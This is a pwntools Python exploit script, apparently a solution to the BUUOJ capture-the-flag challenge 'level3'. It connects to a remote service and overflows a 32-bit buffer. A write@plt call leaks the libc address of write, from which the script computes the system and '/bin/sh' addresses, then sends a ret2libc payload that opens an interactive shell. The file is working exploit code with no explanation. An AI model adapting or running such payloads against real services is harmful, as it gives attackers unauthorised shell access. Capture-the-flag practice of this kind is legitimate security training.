from pwn import *

elf = ELF(r'../../pwn_file/level3')
r = remote('node5.buuoj.cn', 29589)
libc = ELF(r'../libc/libc-2.23_32.so')

context.log_level = 'debug'

main_addr = elf.sym['main']
vuln_addr = 0x804844B
write_got = elf.got['write']
write_plt = elf.plt['write']

# 使用write泄漏地址
payload = b'A' * 0x88 + p32(0) + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(write_got) + p32(4)
r.sendafter(b'Input:\n', payload)
write_addr = u32(r.recv(4))
print(f"write_addr: {str(hex(write_addr))}")

base_addr = write_addr - libc.sym['write']
system_addr = base_addr + libc.sym['system']
sh_addr = base_addr + libc.search(b'/bin/sh').__next__()

print(f"system_addr: {str(hex(system_addr))}")
print(f"sh_addr: {str(hex(sh_addr))}")

payload2 = b'A' * 0x88 + p32(0) + p32(system_addr) + p32(0) + p32(sh_addr)
r.sendafter(b'Input:\n', payload2)
r.interactive()
